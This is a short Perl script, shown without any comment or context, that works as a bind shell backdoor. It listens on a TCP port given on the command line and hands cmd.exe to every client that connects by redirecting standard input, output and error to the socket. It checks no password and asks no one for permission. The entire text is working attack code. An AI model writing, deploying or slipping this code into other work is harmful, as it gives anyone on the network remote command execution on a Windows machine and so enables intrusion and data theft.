use Socket;
$port	= $ARGV[0];
$proto	= getprotobyname('tcp');
socket(SERVER, PF_INET, SOCK_STREAM, $proto);
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack("l", 1));
bind(SERVER, sockaddr_in($port, INADDR_ANY));
listen(SERVER, SOMAXCONN);
for(; $paddr = accept(CLIENT, SERVER); close CLIENT)
{
open(STDIN, ">&CLIENT");
open(STDOUT, ">&CLIENT");
open(STDERR, ">&CLIENT");
system('cmd.exe');
close(STDIN);
close(STDOUT);
close(STDERR);
} 